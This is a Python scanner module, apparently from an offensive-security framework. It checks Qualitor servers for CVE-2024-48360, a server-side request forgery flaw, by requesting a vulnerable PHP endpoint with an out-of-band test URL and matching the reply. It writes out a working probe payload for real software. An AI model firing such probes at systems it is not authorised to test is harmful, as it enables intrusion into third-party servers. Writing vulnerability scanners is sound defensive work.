#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Qualitor v8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Qualitor <= v8.24 - Server-Side Request Forgery Detection',
        'description': 'Qualitor v8.24 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /request/viewValidacao.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'ssrf', 'qualitor', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/OpenXP-Research/CVE-2024-48360',
            'https://packetstormsecurity.com/files/182427/Qualitor-8.24-Server-Side-Request-Forgery.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-48360',
        ],
        'cve': 'CVE-2024-48360',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/html/ad/adformmobile/request/viewValidacao.php?url=oast.me'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<h1> Interactsh Server </h1>',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Qualitor <= v8.24 - Server-Side Request Forgery detected', path=path)
            return True
        return False

